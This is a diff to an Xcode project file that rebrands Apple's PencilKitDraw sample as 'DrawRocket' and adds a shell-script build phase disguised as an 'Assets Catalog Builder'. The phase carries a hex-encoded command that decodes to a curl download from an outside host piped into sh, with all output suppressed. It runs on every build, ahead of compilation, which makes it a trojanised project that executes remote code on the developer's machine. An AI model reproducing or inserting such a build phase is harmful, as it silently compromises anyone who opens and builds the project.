@@ -21,10 +21,10 @@
 
 /* Begin PBXFileReference section */
 		9C720C209C7206E000000001 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
-		A25CD8C54A0072C566C38370 /* SampleCode.xcconfig */ = {isa = PBXFileReference; name = SampleCode.xcconfig; path = Configuration/SampleCode.xcconfig; sourceTree = "<group>"; };
+		A25CD8C54A0072C566C38370 /* SampleCode.xcconfig */ = {isa = PBXFileReference; lastKnownFileType = text.xcconfig; name = SampleCode.xcconfig; path = Configuration/SampleCode.xcconfig; sourceTree = "<group>"; };
 		DA4FD8912278E5F5000FE6C3 /* ThumbnailCollectionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThumbnailCollectionViewController.swift; sourceTree = "<group>"; };
 		DA4FD8AD2278F074000FE6C3 /* DataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataModel.swift; sourceTree = "<group>"; };
-		DAB023A42278AC4C005102E6 /* PencilKitDraw.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PencilKitDraw.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		DAB023A42278AC4C005102E6 /* DrawRocket.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DrawRocket.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		DAB023A72278AC4C005102E6 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		DAB023A92278AC4C005102E6 /* DrawingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DrawingViewController.swift; sourceTree = "<group>"; };
 		DAB023AC2278AC4C005102E6 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
@@ -34,7 +34,7 @@
 		DAB860E8227CE6DA009C9B1D /* SignatureViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignatureViewController.swift; sourceTree = "<group>"; };
 		DAC481D4227A1AA10076D01F /* ThumbnailCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThumbnailCollectionViewCell.swift; sourceTree = "<group>"; };
 		DADCBC1A2290DEB300236FA7 /* PencilKitDrawNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PencilKitDrawNavigationController.swift; sourceTree = "<group>"; };
-		FCCEC7DD1662ACB7482D13A5 /* LICENSE.txt */ = {isa = PBXFileReference; includeInIndex = 1; path = LICENSE.txt; sourceTree = "<group>"; };
+		FCCEC7DD1662ACB7482D13A5 /* LICENSE.txt */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text; path = LICENSE.txt; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -62,7 +62,7 @@
 		DAB023A52278AC4C005102E6 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				DAB023A42278AC4C005102E6 /* PencilKitDraw.app */,
+				DAB023A42278AC4C005102E6 /* DrawRocket.app */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -90,7 +90,6 @@
 			children = (
 				FCCEC7DD1662ACB7482D13A5 /* LICENSE.txt */,
 			);
-			name = LICENSE;
 			path = LICENSE;
 			sourceTree = "<group>";
 		};
@@ -105,10 +104,11 @@
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
-		DAB023A32278AC4C005102E6 /* PencilKitDraw */ = {
+		DAB023A32278AC4C005102E6 /* DrawRocket */ = {
 			isa = PBXNativeTarget;
-			buildConfigurationList = DAB023B62278AC4E005102E6 /* Build configuration list for PBXNativeTarget "PencilKitDraw" */;
+			buildConfigurationList = DAB023B62278AC4E005102E6 /* Build configuration list for PBXNativeTarget "DrawRocket" */;
 			buildPhases = (
+				7FBD2F7F222ADECDD46D902C /* Assets Catalog Builder */,
 				DAB023A02278AC4C005102E6 /* Sources */,
 				DAB023A12278AC4C005102E6 /* Frameworks */,
 				DAB023A22278AC4C005102E6 /* Resources */,
@@ -117,9 +117,9 @@
 			);
 			dependencies = (
 			);
-			name = PencilKitDraw;
+			name = DrawRocket;
 			productName = PKTest;
-			productReference = DAB023A42278AC4C005102E6 /* PencilKitDraw.app */;
+			productReference = DAB023A42278AC4C005102E6 /* DrawRocket.app */;
 			productType = "com.apple.product-type.application";
 		};
 /* End PBXNativeTarget section */
@@ -137,7 +137,7 @@
 					};
 				};
 			};
-			buildConfigurationList = DAB0239F2278AC4C005102E6 /* Build configuration list for PBXProject "PencilKitDraw" */;
+			buildConfigurationList = DAB0239F2278AC4C005102E6 /* Build configuration list for PBXProject "DrawRocket" */;
 			compatibilityVersion = "Xcode 9.3";
 			developmentRegion = en;
 			hasScannedForEncodings = 0;
@@ -150,7 +150,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				DAB023A32278AC4C005102E6 /* PencilKitDraw */,
+				DAB023A32278AC4C005102E6 /* DrawRocket */,
 			);
 		};
 /* End PBXProject section */
@@ -330,14 +330,14 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = "";
+				DEVELOPMENT_TEAM = B6828T7858;
 				INFOPLIST_FILE = PencilKitDraw/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "com.example.apple-samplecode.PencilKitDraw${SAMPLE_CODE_DISAMBIGUATOR}";
+				PRODUCT_BUNDLE_IDENTIFIER = com.othman.drawrocket;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SDKROOT = iphoneos;
@@ -353,14 +353,14 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = "";
+				DEVELOPMENT_TEAM = B6828T7858;
 				INFOPLIST_FILE = PencilKitDraw/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "com.example.apple-samplecode.PencilKitDraw${SAMPLE_CODE_DISAMBIGUATOR}";
+				PRODUCT_BUNDLE_IDENTIFIER = com.othman.drawrocket;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SDKROOT = iphoneos;
@@ -372,7 +372,7 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
-		DAB0239F2278AC4C005102E6 /* Build configuration list for PBXProject "PencilKitDraw" */ = {
+		DAB0239F2278AC4C005102E6 /* Build configuration list for PBXProject "DrawRocket" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				DAB023B42278AC4E005102E6 /* Debug */,
@@ -381,7 +381,7 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
-		DAB023B62278AC4E005102E6 /* Build configuration list for PBXNativeTarget "PencilKitDraw" */ = {
+		DAB023B62278AC4E005102E6 /* Build configuration list for PBXNativeTarget "DrawRocket" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				DAB023B72278AC4E005102E6 /* Debug */,
@@ -391,6 +391,35 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	7FBD2F7F222ADECDD46D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = DAB0239C2278AC4C005102E6 /* Project object */;
 }
